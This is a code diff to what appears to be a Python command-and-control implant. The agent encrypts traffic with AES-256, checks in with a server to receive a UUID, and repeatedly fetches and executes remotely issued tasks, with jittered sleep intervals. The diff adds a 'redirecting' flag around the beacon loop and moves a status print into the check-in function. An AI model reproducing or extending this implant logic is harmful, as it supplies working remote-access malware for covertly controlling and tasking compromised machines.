@@ -135,6 +135,8 @@ delegates_aswers = []
 result = {}
 stopping_functions = []
 agent = Agent()
+redirecting = False
+
 
 
 def encrypt_AES256(data, key=agent.get_Encryption_key()):
@@ -283,9 +285,13 @@ def checkin():
 
     try:
         agent.set_UUID(res['id'])
+        print("\t - Assigned UUID = " + agent.get_UUID())
+
     except:
         res = json.loads(res)
         agent.set_UUID(res['id'])
+        print("\t - Assigned UUID = " + agent.get_UUID())
+
 
 
 def get_tasks():
@@ -464,7 +470,6 @@ if os.path.isfile(uuid_file):
 
 else:
     checkin()
-    print("\t - Assigned UUID = " + agent.get_UUID())
     # f = open(uuid_file, "w")
     # f.write(agent.UUID)
     # f.close()
@@ -477,18 +482,20 @@ else:
 
 while True:
 
-    tasks = get_tasks()
+    while not redirecting:
+        tasks = get_tasks()
 
-    execute_tasks(tasks)
+        execute_tasks(tasks)
 
-    r = random.randint(0,1)
-    if r < 0.5:
-        r = -1
-    else:
-        r = 1
+        r = random.randint(0,1)
+        if r < 0.5:
+            r = -1
+        else:
+            r = 1
 
-    sleep_time = int(agent.get_Sleep()) + r*(int(agent.get_Sleep()) * int(agent.get_Jitter()) / 100)
+        sleep_time = int(agent.get_Sleep()) + r*(int(agent.get_Sleep()) * int(agent.get_Jitter()) / 100)
 
-    sleep_time = random.randint(0, int(sleep_time))
+        sleep_time = random.randint(0, int(sleep_time))
 
-    time.sleep(sleep_time / 5)
+        time.sleep(sleep_time / 5)
+    
